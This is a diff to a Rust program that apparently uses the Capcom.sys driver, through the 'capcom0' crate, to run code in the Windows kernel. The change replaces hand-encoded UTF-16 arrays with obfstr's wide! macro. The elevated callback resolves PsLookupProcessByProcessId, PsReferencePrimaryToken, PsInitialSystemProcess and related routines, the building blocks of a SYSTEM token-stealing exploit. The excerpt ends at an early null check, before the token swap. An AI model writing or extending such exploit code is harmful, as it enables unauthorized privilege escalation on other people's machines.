@@ -17,26 +17,11 @@ use winapi::um::processthreadsapi::{CreateProcessW, STARTUPINFOW, PROCESS_INFORM
 use winapi::um::processenv::{GetCommandLineW};
 use winapi::um::shellapi::{CommandLineToArgvW};
 
-static PS_LOOKUP_PROCESS_BY_PROCESS_ID_NO_NUL: [u16; 26] = [80u16, 115, 76, 111, 111, 107, 117, 112, 80, 114, 111, 99, 101, 115, 115, 66, 121, 80, 114, 111, 99, 101, 115, 115, 73, 100];
-static OB_DEREFERENCE_OBJECT_NO_NUL: [u16; 19] = [79u16, 98, 68, 101, 114, 101, 102, 101, 114, 101, 110, 99, 101, 79, 98, 106, 101, 99, 116];
-static PS_REFERENCE_PRIMARY_TOKEN_NO_NUL: [u16; 23] = [80u16, 115, 82, 101, 102, 101, 114, 101, 110, 99, 101, 80, 114, 105, 109, 97, 114, 121, 84, 111, 107, 101, 110];
-static PS_DEREFERENCE_PRIMARY_TOKEN_NO_NUL: [u16; 25] = [80u16, 115, 68, 101, 114, 101, 102, 101, 114, 101, 110, 99, 101, 80, 114, 105, 109, 97, 114, 121, 84, 111, 107, 101, 110];
-static PS_GET_CURRENT_PROCESS_ID_NO_NUL: [u16; 21] = [80u16, 115, 71, 101, 116, 67, 117, 114, 114, 101, 110, 116, 80, 114, 111, 99, 101, 115, 115, 73, 100];
-static PS_INITIAL_SYSTEM_PROCESS_NO_NUL: [u16; 22] = [80u16, 115, 73, 110, 105, 116, 105, 97, 108, 83, 121, 115, 116, 101, 109, 80, 114, 111, 99, 101, 115, 115];
+use obfstr::wide;
+
+use capcom0::get_system_routine_address;
 
 type PEPROCESS = PVOID;
-
-macro_rules! get_system_routine_address {
-	($ctx:expr, $ty:ty, $ws:expr) => {{
-		let ws = &$ws;
-		let mut us = UNICODE_STRING {
-			Length: mem::size_of_val(ws) as u16,
-			MaximumLength: mem::size_of_val(ws) as u16,
-			Buffer: ws.as_ptr() as *mut u16,
-		};
-		mem::transmute::<_, $ty>(($ctx.get_system_routine_address)(&mut us))
-	}};
-}
 
 fn main() {
 	let result = capcom0::setup(|_, device| {
@@ -46,22 +31,22 @@ fn main() {
 			device.elevate(|ctx| {
 				let PsGetCurrentProcessId = get_system_routine_address!(ctx,
 					unsafe extern "system" fn() -> HANDLE,
-					PS_GET_CURRENT_PROCESS_ID_NO_NUL);
+					wide!("PsGetCurrentProcessId"));
 				let PsLookupProcessByProcessId = get_system_routine_address!(ctx,
 					unsafe extern "system" fn(HANDLE, *mut PEPROCESS) -> NTSTATUS,
-					PS_LOOKUP_PROCESS_BY_PROCESS_ID_NO_NUL);
+					wide!("PsLookupProcessByProcessId"));
 				let ObDereferenceObject = get_system_routine_address!(ctx,
 					unsafe extern "system" fn(PVOID),
-					OB_DEREFERENCE_OBJECT_NO_NUL);
+					wide!("ObDereferenceObject"));
 				let PsReferencePrimaryToken = get_system_routine_address!(ctx,
 					unsafe extern "system" fn(PEPROCESS) -> PACCESS_TOKEN,
-					PS_REFERENCE_PRIMARY_TOKEN_NO_NUL);
+					wide!("PsReferencePrimaryToken"));
 				let PsDereferencePrimaryToken = get_system_routine_address!(ctx,
 					unsafe extern "system" fn(PACCESS_TOKEN),
-					PS_DEREFERENCE_PRIMARY_TOKEN_NO_NUL);
+					wide!("PsDereferencePrimaryToken"));
 				let SystemProcess = *get_system_routine_address!(ctx,
 					*mut PEPROCESS,
-					PS_INITIAL_SYSTEM_PROCESS_NO_NUL);
+					wide!("PsInitialSystemProcess"));
 
 				// Early safety check...
 				if SystemProcess == ptr::null_mut() {
